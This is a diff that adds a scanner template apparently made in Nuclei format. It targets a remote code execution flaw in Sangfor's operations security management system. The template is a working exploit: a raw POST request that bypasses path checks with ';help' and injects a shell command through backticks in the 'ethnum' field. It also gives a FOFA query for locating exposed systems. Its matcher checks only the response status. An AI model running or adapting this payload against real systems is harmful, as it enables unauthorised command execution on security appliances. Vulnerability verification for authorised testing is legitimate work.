@@ -1,0 +1,28 @@
+id: poc-ud7q6xc3oum35tke
+info:
+  name: 深信服运维安全管理系统 del_net 远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ud7q6xc3oum35tke'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ud7q6xc3oum35tke
+    fofa: body="/fort/login" && header="FORTSESSIONID"
+http:
+- raw:
+  - 'POST /fort/system;help/netConfig/del_net HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+
+    ethnum=%60sleep%205%60&IPV=255.255.255.1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
